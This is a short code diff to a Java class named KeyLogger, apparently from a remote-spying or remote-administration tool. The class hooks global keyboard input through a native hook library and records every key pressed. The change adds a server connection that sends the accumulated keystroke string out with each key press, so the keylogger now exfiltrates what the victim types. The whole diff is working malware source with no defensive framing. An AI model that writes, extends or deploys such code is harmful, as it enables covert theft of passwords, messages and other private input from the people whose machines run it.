@@ -9,8 +9,9 @@ public class KeyLogger implements NativeKeyListener {
     public boolean capsLock = false;
     boolean isHooking;
     String str = "";
+    private Server server;
 
-    public KeyLogger() {
+    public KeyLogger(Server server) {
         try {
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException e) {
@@ -18,6 +19,7 @@ public class KeyLogger implements NativeKeyListener {
         }
         GlobalScreen.addNativeKeyListener(this);
         this.isHooking = false;
+        this.server = server;
     }
 
     public String ConvertKey(String key) {
@@ -117,6 +119,7 @@ public class KeyLogger implements NativeKeyListener {
     public void nativeKeyPressed(NativeKeyEvent arg0) {
         if (this.isHooking) {
             str += ConvertKey(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
+            this.server.SendData("ViewKey", str);
         }
     }
 
